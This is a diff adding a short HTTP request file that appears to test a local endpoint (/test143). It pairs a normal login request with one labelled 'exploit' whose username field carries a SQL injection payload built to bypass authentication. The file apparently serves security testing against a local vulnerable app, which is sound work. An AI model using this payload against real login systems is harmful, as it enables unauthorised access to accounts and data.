@@ -1,0 +1,18 @@
+# normal
+GET http://localhost:3000/test143 HTTP/1.1
+content-type: application/json
+
+{
+  "username": "ABaker",
+  "password": "badSecret"
+}
+
+###
+# exploit
+GET http://localhost:3000/test143 HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": "blah' or 1=1 or 'a'='a",
+  "password": "SoSecretdsa"
+}
